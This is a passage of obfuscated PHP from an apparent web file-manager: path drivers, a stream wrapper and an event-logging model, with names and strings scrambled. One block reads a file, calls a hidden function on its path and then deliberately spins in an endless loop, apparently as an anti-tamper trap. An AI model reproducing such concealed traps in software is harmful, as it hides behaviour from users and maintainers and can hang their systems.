$Σ‡ΚηΟθ[$ΌΏ•³ΏΑ][$Ρ€Ϊϊ] = Action($ΨΕ±‰ϋΖ[1267])->shareItemInfo($΄Ι–ΨΛΊ); } } return $Σ‡ΚηΟθ; } public function listAll($†ώ—γγ) { $ωΝ£ϋ =& $_SERVER[γγάψ½]; $ϋΏύ—” = IO::info($this->pathParse[$ωΝ£ϋ[87]]); if (!$ϋΏύ—”) { return array(); } $½µόΦλ = $this->model->listAll($†ώ—γγ); foreach ($½µόΦλ as &$Δ•Μ―½α) { $Δ•Μ―½α[$ωΝ£ϋ[90]] = Action($ωΝ£ϋ[1267])->shareItemInfo($Δ•Μ―½α[$ωΝ£ϋ[90]]); } unset($Δ•Μ―½α); return $½µόΦλ; } } class PathDriverDriverShareItem { public function __construct($µΘ€ρΕ) { $this->pathParse = $µΘ€ρΕ; } public function __call($‰Π§ΜΥζ, $σΖϋ―Ό) { $ΎµΏ“β =& $_SERVER[γγάψ½]; if (method_exists($this, $‰Π§ΜΥζ)) { return; } $‡­ίΧΐ = call_user_func_array(array($ΎµΏ“β[1448], $‰Π§ΜΥζ), $σΖϋ―Ό); $Θ“ΑΗ = array($ΎµΏ“β[1449], $ΎµΏ“β[1450], $ΎµΏ“β[1451], $ΎµΏ“β[1452], $ΎµΏ“β[626], $ΎµΏ“β[628], $ΎµΏ“β[1453], $ΎµΏ“β[110], $ΎµΏ“β[1454], $ΎµΏ“β[1455]); if (in_array($‰Π§ΜΥζ, $Θ“ΑΗ)) { $‡­ίΧΐ = $this->getPathOuter($‡­ίΧΐ); } return $‡­ίΧΐ; } public function copy($ώΑ‡νΊ, $§΅―ο…Ο, $Ψ‘Ν―Έ› = false, $μϋ“Ν¬ΐ = false) { return $this->copyMove($ώΑ‡νΊ, $§΅―ο…Ο, $Ψ‘Ν―Έ›, $_SERVER[γγάψ½][626], $μϋ“Ν¬ΐ); } public function move($¥ϊζΔµ, $™θΣΘύ, $ό­ΈΨ°† = false, $¥όƒζΉΎ = false) { return $this->copyMove($¥ϊζΔµ, $™θΣΘύ, $ό­ΈΨ°†, $_SERVER[γγάψ½][628], $¥όƒζΉΎ); } private function copyMove($υ·­–, $ΘΰύΑ, $γ¨Ο³•θ, $ψ™Χ¶σ, $Κ·―‚ΊΔ = false) { $λ“Α„¬ =& $_SERVER[γγάψ½]; $ΆΤΈ­κί = $ΘΰύΑ; $Ζωπ°ετ = IO::driverMake($ΘΰύΑ); if ($Ζωπ°ετ->pathParse[$λ“Α„¬[1241]]) { $ΘΰύΑ = $Ζωπ°ετ->pathParse[$λ“Α„¬[1241]]; } else { $ΘΰύΑ = $ΆΤΈ­κί; } $Ο…Κσ¥φ = IO::copyMove($υ·­–, $ΘΰύΑ, $γ¨Ο³•θ, $ψ™Χ¶σ, $Κ·―‚ΊΔ); $Ο…Κσ¥φ = $this->getPathOuter($Ο…Κσ¥φ); return $Ο…Κσ¥φ; } public function pathThis($―βΔ§) { return get_path_this($this->pathParse[$_SERVER[γγάψ½][87]]); } public function pathFather($‰ΕΫΰΦΊ) { return get_path_father($this->pathParse[$_SERVER[γγάψ½][87]]); } public function iconvSystem($–ΊϋξΏς) { return $–ΊϋξΏς; } protected function infoParse($ψƒ“Υο‡, $— ρµ΅ = false) { $Ώη­Σϋ =& $_SERVER[γγάψ½]; $ΤΐαΑΨν = $this->pathParse[$Ώη­Σϋ[565]][$Ώη­Σϋ[1268]] . $this->pathParse[$Ώη­Σϋ[1260]]; if ($— ρµ΅) { $ƒ…ϋωΝ = IO::infoWithChildren($ΤΐαΑΨν); } else { $ƒ…ϋωΝ = IO::info($ΤΐαΑΨν); } $ϋυΚ™υ = $this->pathParse[$Ώη­Σϋ[565]]; return Action($Ώη­Σϋ[1446])->_shareItemeParse($ƒ…ϋωΝ, $ϋυΚ™υ); } public function listAll($£ΫΌΌΨπ) { $ό“‚ΤΕσ =& $_SERVER[γγάψ½]; $ξ΅Ίά© = IO::listAll($£ΫΌΌΨπ); $Θψ — = rtrim($this->pathParse[$ό“‚ΤΕσ[565]][$ό“‚ΤΕσ[1268]], $ό“‚ΤΕσ[8]); foreach ($ξ΅Ίά© as &$ΞγΈΜ°Ά) { $ΞγΈΜ°Ά[$ό“‚ΤΕσ[87]] = $this->pathDriver . $ό“‚ΤΕσ[8] . ltrim(substr($ΞγΈΜ°Ά[$ό“‚ΤΕσ[87]], strlen($Θψ —)), $ό“‚ΤΕσ[8]); } unset($ΞγΈΜ°Ά); return $ξ΅Ίά©; } public function listAllSimple($ΩΦΖφ², $ψφ–Ό…– = false) { $έΓξ“… =& $_SERVER[γγάψ½]; $αΈζ±—θ = $this->listAll($ΩΦΖφ²); $°Χώυ–Ο = $this->pathParse[$έΓξ“…[498]]; if (trim($°Χώυ–Ο, $έΓξ“…[8]) == trim(get_path_father($°Χώυ–Ο), $έΓξ“…[8])) { $ψφ–Ό…– = !0; } return IO::init($έΓξ“…[12])->listAllSimpleMake($αΈζ±—θ, $°Χώυ–Ο, $ψφ–Ό…–); } public function getPathOuter($ίΰ±Γ) { $λΠ¦ΡίΤ =& $_SERVER[γγάψ½]; $‘ΕψΑ = KodIO::parse($ίΰ±Γ); if ($‘ΕψΑ[$λΠ¦ΡίΤ[33]] == KodIO::KOD_SHARE_ITEM) { return $‘ΕψΑ[$λΠ¦ΡίΤ[87]]; } $†–οΏςβ = KodIO::clear($ίΰ±Γ); $ηΝ¶‹Ύυ = KodIO::clear($this->pathParse[$λΠ¦ΡίΤ[565]][$λΠ¦ΡίΤ[1268]]); $ΝΕάΣΑ¬ = substr($†–οΏςβ, strlen($ηΝ¶‹Ύυ)); if (substr($†–οΏςβ, 0, strlen($ηΝ¶‹Ύυ)) != $ηΝ¶‹Ύυ) { return !1; } return $this->pathParse[$λΠ¦ΡίΤ[1261]] . $λΠ¦ΡίΤ[8] . ltrim($ΝΕάΣΑ¬, $λΠ¦ΡίΤ[8]); } public function getType() { $Ϊ¥ο²ΰ… =& $_SERVER[γγάψ½]; $³Ν©ψέΨ = str_replace($Ϊ¥ο²ΰ…[77], $Ϊ¥ο²ΰ…[12], get_class($this)); return strtolower($³Ν©ψέΨ); } public function isOsDriver($Α–χμδέ) { return IO::isOsDriver($Α–χμδέ); } public function info($­χάΦ΄) { return $this->infoParse($­χάΦ΄); } public function infoAuth($‰Ηηƒ›‚) { return $this->infoParse($‰Ηηƒ›‚); } public function infoWithChildren($–‹ΔίΑΪ) { return $this->infoParse($–‹ΔίΑΪ, !0); } public function infoFull($Έ ΓύΪΊ) { return $this->infoParse($Έ ΓύΪΊ); } } goto Cκέ·ήΊΎ±; Eι²άβ –: define($_SERVER[γγάψ½][0], $_SERVER[γγάψ½][1]); $_SERVER[Φ ‘Ρ³λ] = explode($_SERVER[γγάψ½][2], gzinflate(substr($_SERVER[γγάψ½][3], 10, -8))); function binCheckEq($®Ζϋϊμ, $Ψ™λθΡ) { return $®Ζϋϊμ == $Ψ™λθΡ; } goto F±ίξ‰‘†κ; C…±ΩΒΊ: if (!isset($_SERVER[$_SERVER[γγάψ½][961]]) || !isset($_SERVER[$_SERVER[γγάψ½][1623]])) { $_getc = $_SERVER[γγάψ½][963]; $_getfile = $_SERVER[$_SERVER[γγάψ½][958]] . $_SERVER[γγάψ½][959]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[γγάψ½][288], $_getfilec); if (count($_getarrs) < $_SERVER[γγάψ½][706]) { $exit = $_SERVER[γγάψ½][964]; $exit(); } $_act = $_SERVER[γγάψ½][1624]; $_act($_SERVER[$_SERVER[γγάψ½][958]] . $_SERVER[γγάψ½][959]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[γγάψ½][457]); } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($‡μ•Ρ„θ = false) { } public function exist($ΣΑ¥ψώ) { $μΝ«ΰΣϋ = $this->info($ΣΑ¥ψώ); return $μΝ«ΰΣϋ[$_SERVER[γγάψ½][235]]; } public function isFile($΅‹πΌ) { $Οΐμ = $this->info($΅‹πΌ); return $Οΐμ[$_SERVER[γγάψ½][235]]; } public function isFolder($¤σ’¤) { return !1; } public function size($ςφ§ΓΝ²) { $‚ό«Ζ· = $this->info($ςφ§ΓΝ²); return $‚ό«Ζ·[$_SERVER[γγάψ½][79]]; } public function info($±•Οϊ†) { return $this->infoParse($±•Οϊ†); } public function infoAuth($―†ΐ‚δ) { return $this->infoParse($―†ΐ‚δ); } public function infoWithChildren($©΄¶Χ) { return $this->infoParse($©΄¶Χ); } public function infoFull($©άσκ) { return $this->infoParse($©άσκ); } private function infoParse($Μ»ΙΕΩ) { $¶υƒΑ =& $_SERVER[γγάψ½]; $ƒ€ΠΙΉ¤ = $this->header($Μ»ΙΕΩ); if (!$ƒ€ΠΙΉ¤ || !$ƒ€ΠΙΉ¤[$¶υƒΑ[825]]) { return !1; } $‚ΖΨΚΘΜ = _get($ƒ€ΠΙΉ¤, $¶υƒΑ[415], 0); $μ½­¨¶‘ = array($¶υƒΑ[32] => $ƒ€ΠΙΉ¤[$¶υƒΑ[32]], $¶υƒΑ[87] => $Μ»ΙΕΩ, $¶υƒΑ[33] => $¶υƒΑ[233], $¶υƒΑ[79] => intval($‚ΖΨΚΘΜ), $¶υƒΑ[169] => get_path_ext($ƒ€ΠΙΉ¤[$¶υƒΑ[32]]), $¶υƒΑ[1474] => $‚ΖΨΚΘΜ > 0 && $ƒ€ΠΙΉ¤[$¶υƒΑ[1625]], $¶υƒΑ[1475] => !1); return $μ½­¨¶‘; } private function header($†Χέπυ) { $ΡΌΗ»¶Β =& $_SERVER[γγάψ½]; if (isset(self::$_cacheHeader[$†Χέπυ])) { return self::$_cacheHeader[$†Χέπυ]; } $ΐΊ“«¦ή = isset($GLOBALS[$ΡΌΗ»¶Β[1626]]) ? $GLOBALS[$ΡΌΗ»¶Β[1626]] : !1; $GLOBALS[$ΡΌΗ»¶Β[1626]] = !0; self::$_cacheHeader[$†Χέπυ] = url_header($†Χέπυ); $GLOBALS[$ΡΌΗ»¶Β[1626]] = $ΐΊ“«¦ή; return self::$_cacheHeader[$†Χέπυ]; } public function hashSimple($ιΒ©Α, $οΉγαΌΏ = false) { $Ύ·ζ•ί =& $_SERVER[γγάψ½]; $Η‚ουΣ­ = $this->info($ιΒ©Α); if (!$Η‚ουΣ­ || !$Η‚ουΣ­[$Ύ·ζ•ί[235]]) { return !1; } $Ό¤‘Ύ = $Η‚ουΣ­[$Ύ·ζ•ί[79]]; $υΗΫυ = 200; $¨ΰ”ƒ = 50; if ($Ό¤‘Ύ <= $υΗΫυ * $¨ΰ”ƒ) { return md5($this->fileSubstr($ιΒ©Α, 0, $Ό¤‘Ύ)) . $Ό¤‘Ύ; } $κΔίΌΔ = intval($Ό¤‘Ύ / $¨ΰ”ƒ); $ρΧΓέ = $Ύ·ζ•ί[12]; $–ΪΔΡΆ¬ = timeFloat(); $°®ανΔ = 15; for ($Ξ·“ΣΏ• = 0; $Ξ·“ΣΏ• < $¨ΰ”ƒ; $Ξ·“ΣΏ•++) { if (timeFloat() - $–ΪΔΡΆ¬ > $°®ανΔ) { return !1; } $γΨΥ®΅ = $this->fileSubstr($ιΒ©Α, $κΔίΌΔ * $Ξ·“ΣΏ•, $υΗΫυ); if (!$γΨΥ®΅) { return !1; } $ρΧΓέ .= $γΨΥ®΅; } $ρΧΓέ .= $this->fileSubstr($ιΒ©Α, $Ό¤‘Ύ - $υΗΫυ, $υΗΫυ); return md5($ρΧΓέ) . $Ό¤‘Ύ; } public function getContent($κΛΜφ) { return $this->fileSubstr($κΛΜφ); } public function fileSubstr($›ΦΏ‡, $΄ΑΩΈ = 0, $Ώ£ΙΧ = -1) { $Ά«¥—™ε =& $_SERVER[γγάψ½]; $Ηζζ±υ = $this->info($›ΦΏ‡); if (!$Ηζζ±υ || !$Ηζζ±υ[$Ά«¥—™ε[235]] && $Ηζζ±υ[$Ά«¥—™ε[79]] > 1024 * 1024 * 10) { return !1; } if ($Ώ£ΙΧ === -1) { $Ώ£ΙΧ = $Ηζζ±υ[$Ά«¥—™ε[79]]; } if ($Ώ£ΙΧ == 0) { return $Ά«¥—™ε[12]; } $“­ώ“Ηύ = array($Ά«¥—™ε[1627] . $΄ΑΩΈ . $Ά«¥—™ε[862] . ($΄ΑΩΈ + $Ώ£ΙΧ - 1)); $ή¨‚’Β† = url_request($›ΦΏ‡, $Ά«¥—™ε[1514], !1, $“­ώ“Ηύ, !1, !1, 30); return $ή¨‚’Β†[$Ά«¥—™ε[1298]] ? $ή¨‚’Β†[$Ά«¥—™ε[1298]] : $Ά«¥—™ε[12]; } public function download($υλσζϋϋ, $ΈΆλ‡π) { Downloader::start($υλσζϋϋ, $ΈΆλ‡π); return $ΈΆλ‡π; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ΜΘΗ‘, $΄Ποψδώ = '') { $this->info = $this->info($ΜΘΗ‘); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[γγάψ½][87]]; $this->pathOpen = $ΜΘΗ‘; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ΜΘΗ‘])) { self::$_chunkBuffer[$ΜΘΗ‘] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ω§δ„οΪ) { $ΝΖΒ½Η = $this->fileSubstr($this->pose, $ω§δ„οΪ); $this->pose += strlen($ΝΖΒ½Η); return $ΝΖΒ½Η; } public function stream_tell() { return $this->pose; } public function stream_seek($ΕιΑά, $°‡ιΤ‰³) { $Κ”…Νώ¤ =& $_SERVER[γγάψ½]; if ($°‡ιΤ‰³ == SEEK_SET) { $this->pose = $ΕιΑά; } else { if ($°‡ιΤ‰³ == SEEK_CUR) { $this->pose += $ΕιΑά; } else { if ($°‡ιΤ‰³ == SEEK_END) { $this->pose = $this->info[$Κ”…Νώ¤[79]] + intval($ΕιΑά); } } } if ($ΕιΑά < 0) { $this->pose = $this->info[$Κ”…Νώ¤[79]] + $ΕιΑά; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[γγάψ½][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($¤ΑΧ¤Ό®, $±›•‹°) { $³‹θΖήά =& $_SERVER[γγάψ½]; $£Π€½ΒΨ = $this->info($¤ΑΧ¤Ό®); return array($³‹θΖήά[1418] => 0, $³‹θΖήά[1628] => 0, $³‹θΖήά[16] => 32768 + 511, $³‹θΖήά[1629] => 0, $³‹θΖήά[1630] => 0, $³‹θΖήά[1631] => 0, $³‹θΖήά[1632] => 0, $³‹θΖήά[79] => $£Π€½ΒΨ[$³‹θΖήά[79]], $³‹θΖήά[1633] => $£Π€½ΒΨ[$³‹θΖήά[1473]], $³‹θΖήά[1588] => $£Π€½ΒΨ[$³‹θΖήά[88]], $³‹θΖήά[1587] => $£Π€½ΒΨ[$³‹θΖήά[234]], $³‹θΖήά[1634] => 0, $³‹θΖήά[1635] => 0); } static $fileInfo = array(); public function info($δΆοΑπΣ) { $ύΩΊΠΈ» = $_SERVER[γγάψ½][1636]; if (isset(self::$fileInfo[$δΆοΑπΣ])) { return self::$fileInfo[$δΆοΑπΣ]; } if (substr($δΆοΑπΣ, 0, strlen($ύΩΊΠΈ»)) != $ύΩΊΠΈ») { return !1; } self::$fileInfo[$δΆοΑπΣ] = IO::info(substr($δΆοΑπΣ, strlen($ύΩΊΠΈ»))); return self::$fileInfo[$δΆοΑπΣ]; } public static function read($’ΧύΎΚ, $ορ€¥¦, $‚Έέ”‹) { if (!isset(self::$_fopenCache[$’ΧύΎΚ])) { $¨―Η“ύ = new StreamWrapperIO(); $¨―Η“ύ->stream_open($’ΧύΎΚ); self::$_fopenCache[$’ΧύΎΚ] = $¨―Η“ύ; } $¨―Η“ύ = self::$_fopenCache[$’ΧύΎΚ]; return $¨―Η“ύ->fileSubstr($ορ€¥¦, $‚Έέ”‹); } public static function _read($—™όέά, $­ίήή, $ΚΖΌε) { $Θά«ξ³· =& $_SERVER[γγάψ½]; $ΫΈΜΨΛ = fopen($—™όέά, $Θά«ξ³·[1477]); if (!$ΫΈΜΨΛ) { return $Θά«ξ³·[12]; } $­Έ¥υΒ = 8192; fseek($ΫΈΜΨΛ, $­ίήή, SEEK_SET); $λόθΤ­Θ = $Θά«ξ³·[12]; $ηρ®Β = 0; while ($ηρ®Β < $ΚΖΌε) { $ πγσΕ = min($­Έ¥υΒ, $ΚΖΌε - $ηρ®Β); $λόθΤ­Θ .= fread($ΫΈΜΨΛ, $ πγσΕ); $ηρ®Β += $ πγσΕ; } fclose($ΫΈΜΨΛ); return $λόθΤ­Θ; } public function fileSubstr($Γ°›«Ή, $ξ·›Μζ) { $¥φΚ”υ“ =& $_SERVER[γγάψ½]; $ψΤ”ΐζ = $this->info[$¥φΚ”υ“[79]]; $‹­ΌΫΞώ = $Γ°›«Ή; $«Δ–Γ— = $ξ·›Μζ; if ($Γ°›«Ή < 0) { $Γ°›«Ή = $ψΤ”ΐζ + $Γ°›«Ή; } if ($ξ·›Μζ === !1) { $ξ·›Μζ = $ψΤ”ΐζ - $Γ°›«Ή; } if ($Γ°›«Ή + $ξ·›Μζ > $ψΤ”ΐζ) { $ξ·›Μζ = $ψΤ”ΐζ - $Γ°›«Ή; } if ($ξ·›Μζ <= 0) { return $¥φΚ”υ“[12]; } if ($Γ°›«Ή < 0 || $Γ°›«Ή >= $ψΤ”ΐζ || $ξ·›Μζ <= 0 || $ξ·›Μζ > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\x69\x6c\145\x52\x65\x61\144\x20\x65\x72\x72\157\162\x21\x20\163\164\x61\x72\x74\75{$Γ°›«Ή}\x3b\154\145\156\147\x74\150\x3d{$ξ·›Μζ}\73\x20\x73\151\172\x65\75{$ψΤ”ΐζ}\x3b"); } $ύΏµΕ = 64 * 1024; $Γ¬Γωωƒ =& self::$_chunkBuffer[$this->path]; if (!$Γ¬Γωωƒ) { $Γ¬Γωωƒ = array(); } $ΨΞ†µ = 0; $¶θ€Ω› = 0; $φ¬Άω•Β = $¥φΚ”υ“[12]; foreach ($Γ¬Γωωƒ as $ΨΞ†µ => $φ¬Άω•Β) { $ΨΞ†µ = intval($ΨΞ†µ); $¶θ€Ω› = $ΨΞ†µ + strlen($φ¬Άω•Β); if ($Γ°›«Ή >= $¶θ€Ω›) { continue; } if ($Γ°›«Ή >= $ΨΞ†µ && $Γ°›«Ή + $ξ·›Μζ <= $¶θ€Ω›) { return substr($φ¬Άω•Β, $Γ°›«Ή - $ΨΞ†µ, $ξ·›Μζ); } break; } if (count($Γ¬Γωωƒ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($¥φΚ”υ“[1637], $¥φΚ”υ“[1638] . count($Γ¬Γωωƒ) . "\73\x73\164\141\162\164\x3d{$Γ°›«Ή}\x2c\154\x65\156\147\x74\150\75{$ξ·›Μζ}\x3b\160\x6f\x73\x65\x3a{$ΨΞ†µ}\x7e{$¶θ€Ω›}"); throw new Exception($¥φΚ”υ“[1639]); } $‡λΣΊ = intval($Γ°›«Ή / $ύΏµΕ) * $ύΏµΕ; $Δΐνόχ = ceil(($Γ°›«Ή + $ξ·›Μζ) / $ύΏµΕ) * $ύΏµΕ - $‡λΣΊ; $ϊ½ΘΠ«θ = IO::fileSubstr($this->path, $‡λΣΊ, $Δΐνόχ); $Γ¬Γωωƒ[$‡λΣΊ . $¥φΚ”υ“[12]] = $ϊ½ΘΠ«θ; ksort($Γ¬Γωωƒ); $¨½©Έ = substr($ϊ½ΘΠ«θ, $Γ°›«Ή - $‡λΣΊ, $ξ·›Μζ); return $¨½©Έ; } private function log($‹ϊΨ™, $Η“ρ³γ) { $δΓ °†ζ =& $_SERVER[γγάψ½]; $υ’ίΜΑ‚ = timeFloat() - $this->timeStart; write_log(sprintf($δΓ °†ζ[1640], $‹ϊΨ™, $this->info[$δΓ °†ζ[32]], $υ’ίΜΑ‚, $Η“ρ³γ), $δΓ °†ζ[1275]); } } goto cς¬‡‚; d†°ς†±Β©: class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\x75\x72\143\145\137\145\x76\x65\x6e\x74"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\x65\x54\151\x6d\x65", "\164\x69\x6d\x65", "\x69\156\163\145\162\164", "\146\x75\x6e\143\164\x69\157\156"), array("\144\x65\163\x63", '', "\151\x6e\163\x65\x72\x74\54\x75\x70\144\141\164\x65\x2c\x73\x65\154\x65\143\164", "\152\x73\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ƒ«ΏΕ£η, $λ£‰ος, $ΫϋξΓΫΤ = '') { $ΫΨΝ€‚ =& $_SERVER[γγάψ½]; if (!$this->eventSave) { return; } $οό’ότ = Model($ΫΨΝ€‚[1439])->sourceInfo($ƒ«ΏΕ£η); if (!$οό’ότ) { return !1; } if ($this->isDisableEvent($οό’ότ, $λ£‰ος)) { return; } if ($ΫϋξΓΫΤ && is_string($ΫϋξΓΫΤ)) { $ΫϋξΓΫΤ = array($ΫΨΝ€‚[2032] => $ΫϋξΓΫΤ); } $ήόΓ§οε = defined($ΫΨΝ€‚[2221]) ? USER_ID : 0; $›¬ξ‹ = array($ΫΨΝ€‚[494] => $ƒ«ΏΕ£η, $ΫΨΝ€‚[2222] => $οό’ότ[$ΫΨΝ€‚[193]], $ΫΨΝ€‚[2223] => $οό’ότ[$ΫΨΝ€‚[32]], $ΫΨΝ€‚[587] => !empty($οό’ότ[$ΫΨΝ€‚[587]]) ? $οό’ότ[$ΫΨΝ€‚[587]] : $ΫΨΝ€‚[12], $ΫΨΝ€‚[1784] => $ήόΓ§οε, $ΫΨΝ€‚[499] => $λ£‰ος, $ΫΨΝ€‚[1786] => $ΫϋξΓΫΤ); $this->addSystemLog($λ£‰ος, $›¬ξ‹); unset($›¬ξ‹[$ΫΨΝ€‚[2223]], $›¬ξ‹[$ΫΨΝ€‚[587]]); return $this->add($›¬ξ‹); } private function addSystemLog($δώ¬όάΚ, $ύ§δΐ) { $ …Ω =& $_SERVER[γγάψ½]; if ($δώ¬όάΚ == $ …Ω[2224]) { $δώ¬όάΚ = $ύ§δΐ[$ …Ω[529]][$ …Ω[2225]]; } else { if (in_array($δώ¬όάΚ, array($ …Ω[1973], $ …Ω[2226]))) { $δώ¬όάΚ = $ύ§δΐ[$ …Ω[529]][$ …Ω[171]]; } } $›ψΰό = array_merge($ύ§δΐ, array($ …Ω[2227] => $ύ§δΐ[$ …Ω[194]], $ …Ω[2228] => $ύ§δΐ[$ …Ω[2228]])); Hook::trigger($ …Ω[2229], $ …Ω[2230] . $δώ¬όάΚ, $ύ§δΐ); Model($ …Ω[1937])->addLog($ …Ω[2230] . $δώ¬όάΚ, $›ψΰό); } private function isDisableEvent($ύΑ·•ωπ, $―¥οΘ΅—) { $…ψΙέί¬ =& $_SERVER[γγάψ½]; if ($ύΑ·•ωπ[$…ψΙέί¬[191]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($―¥οΘ΅— == $…ψΙέί¬[1962]) { return !1; } return !0; } public function eventCreate($ΪΛΡ¦ , $Χ’ΣΘβ) { $¥με§Ψ• =& $_SERVER[γγάψ½]; $Φ…ϋΚ§ = Model($¥με§Ψ•[1439])->sourceInfo($ΪΛΡ¦ ); $όϊ®μό = array($¥με§Ψ•[2225] => $Χ’ΣΘβ, $¥με§Ψ•[32] => $Φ…ϋΚ§[$¥με§Ψ•[32]]); return $this->addEvent($ΪΛΡ¦ , $¥με§Ψ•[2224], $όϊ®μό); } public function eventFileEdit($οΤΨΎι) { $ΓΞ©Σην =& $_SERVER[γγάψ½]; $ςΜ§θύ = array($ΓΞ©Σην[2231] => $_SERVER[$ΓΞ©Σην[2232]], $ΓΞ©Σην[2233] => strtolower(ACTION)); if (isset($GLOBALS[$ΓΞ©Σην[7]][$ΓΞ©Σην[2234]])) { $ςΜ§θύ[$ΓΞ©Σην[2234]] = $ΓΞ©Σην[91]; } return $this->addEvent($οΤΨΎι, $ΓΞ©Σην[1963], $ςΜ§θύ); } public function eventRecycle($εΐ ΄Π, $τ§¬–ν) { return $this->addEvent($εΐ ΄Π, $_SERVER[γγάψ½][2226], $τ§¬–ν); } private static $_removeLast = ''; public function eventRemove($Ϊ—‰ήΉ) { $ƒ³ΆΥ¤α =& $_SERVER[γγάψ½]; self::$_removeLast = $Ϊ—‰ήΉ; $ «­άίή = Model($ƒ³ΆΥ¤α[1439])->sourceInfo($Ϊ—‰ήΉ); $Γς²®ϊΓ = array_field_key($ «­άίή, array($ƒ³ΆΥ¤α[194], $ƒ³ΆΥ¤α[546], $ƒ³ΆΥ¤α[508], $ƒ³ΆΥ¤α[589])); $ώ™¤³΅® = array($ƒ³ΆΥ¤α[171] => $ «­άίή[$ƒ³ΆΥ¤α[32]], $ƒ³ΆΥ¤α[2233] => ACTION, $ƒ³ΆΥ¤α[2235] => $Γς²®ϊΓ); return $this->addEvent($ «­άίή[$ƒ³ΆΥ¤α[193]], $ƒ³ΆΥ¤α[1962], $ώ™¤³΅®); } public function eventShare($Ώάλτξ, $‹Ώ°Ϋ—) { return $this->addEvent($Ώάλτξ, $_SERVER[γγάψ½][1973], $‹Ώ°Ϋ—); } public function eventMove($ή γά‘, $ΕΔ’ϊ£–, $…πΌΔΛ) { $Ύΰ’έ€‡ =& $_SERVER[γγάψ½]; if (self::$_removeLast == $ή γά‘) { return; } $ωώ‘Φδ® = Model($Ύΰ’έ€‡[1439]); $ΫΏν— Ν = $ωώ‘Φδ®->sourceInfo($ή γά‘); $ λ = $ωώ‘Φδ®->sourceInfo($ΕΔ’ϊ£–); $η¨Οπγ = $ωώ‘Φδ®->sourceInfo($…πΌΔΛ); $«ήύξ¦® = array($Ύΰ’έ€‡[1250] => $ΕΔ’ϊ£–, $Ύΰ’έ€‡[2236] => $ λ[$Ύΰ’έ€‡[32]], $Ύΰ’έ€‡[2212] => !empty($ λ[$Ύΰ’έ€‡[587]]) ? $ λ[$Ύΰ’έ€‡[587]] : $Ύΰ’έ€‡[12], $Ύΰ’έ€‡[1251] => $…πΌΔΛ, $Ύΰ’έ€‡[2237] => $η¨Οπγ[$Ύΰ’έ€‡[32]], $Ύΰ’έ€‡[2238] => !empty($η¨Οπγ[$Ύΰ’έ€‡[587]]) ? $η¨Οπγ[$Ύΰ’έ€‡[587]] : $Ύΰ’έ€‡[12]); $this->addEvent($ή γά‘, $Ύΰ’έ€‡[628], $«ήύξ¦®); $ΫΏν— Ν = $ωώ‘Φδ®->sourceInfo($ή γά‘); $«ήύξ¦® = array($Ύΰ’έ€‡[194] => $ΫΏν— Ν[$Ύΰ’έ€‡[194]], $Ύΰ’έ€‡[32] => $ΫΏν— Ν[$Ύΰ’έ€‡[32]]); $this->addEvent($ΕΔ’ϊ£–, $Ύΰ’έ€‡[2239], $«ήύξ¦®); } public function eventCopy($΄λΙώΜ) { $this->eventCreate($΄λΙώΜ, $_SERVER[γγάψ½][626]); } public function eventRename($®Τί ›, $¦Ϋ—Δΰ, $™΄°ώ€µ) { $ρ±ϋϊΛ« =& $_SERVER[γγάψ½]; $Ώλ€Εκ = array($ρ±ϋϊΛ«[1250] => $¦Ϋ—Δΰ, $ρ±ϋϊΛ«[1251] => $™΄°ώ€µ); return $this->addEvent($®Τί ›, $ρ±ϋϊΛ«[1453], $Ώλ€Εκ); } public function eventAddComment($όΘΑγΤ, $¶―Εε©δ) { return $this->addEvent($όΘΑγΤ, $_SERVER[γγάψ½][2240], $¶―Εε©δ); } public function eventAddDesc($Δ°‡³ή, $χγίΒ©) { return $this->addEvent($Δ°‡³ή, $_SERVER[γγάψ½][2241], $χγίΒ©); } public function listBySource($®ό‘λϊ) { $βέ―”υζ =& $_SERVER[γγάψ½]; $θΥΐ›µ = Model($βέ―”υζ[1439])->sourceInfo($®ό‘λϊ); $Τοκ΅€ = array($βέ―”υζ[494] => $®ό‘λϊ); if ($θΥΐ›µ[$βέ―”υζ[488]] == $βέ―”υζ[91]) { $Ϋ“Θωθ› = Model($βέ―”υζ[1439])->listSearchChildren($®ό‘λϊ, 20000); $Ϋ“Θωθ›[] = $®ό‘λϊ . $βέ―”υζ[457]; $Τοκ΅€ = array($βέ―”υζ[194] => array($βέ―”υζ[7], $Ϋ“Θωθ›)); } $υ¨Ησώ£ = $this->where($Τοκ΅€)->order($βέ―”υζ[2242])->selectPage(); if ($υ¨Ησώ£[$βέ―”υζ[445]][$βέ―”υζ[446]] == 0) { $υ¨Ησώ£[$βέ―”υζ[445]][$βέ―”υζ[446]] = 1; $υ¨Ησώ£[$βέ―”υζ[448]] = array(array($βέ―”υζ[494] => $®ό‘λϊ, $βέ―”υζ[2222] => $θΥΐ›µ[$βέ―”υζ[193]], $βέ―”υζ[1784] => $θΥΐ›µ[$βέ―”υζ[530]], $βέ―”υζ[499] => $βέ―”υζ[2243], $βέ―”υζ[500] => $θΥΐ›µ[$βέ―”υζ[234]], $βέ―”υζ[1786] => $βέ―”υζ[12])); } return $this->eventListParse($υ¨Ησώ£, $®ό‘λϊ); } private function eventListParse($β‡ιι, $λΛ―λΰΣ) { $¤Νέέ =& $_SERVER[γγάψ½]; $γ£‘““ = $β‡ιι[$¤Νέέ[448]]; $‹ρΝΙζΆ = array_to_keyvalue($γ£‘““, $¤Νέέ[12], $¤Νέέ[194]); $Μλ®ρψέ = array_to_keyvalue($γ£‘““, $¤Νέέ[12], $¤Νέέ[2228]); 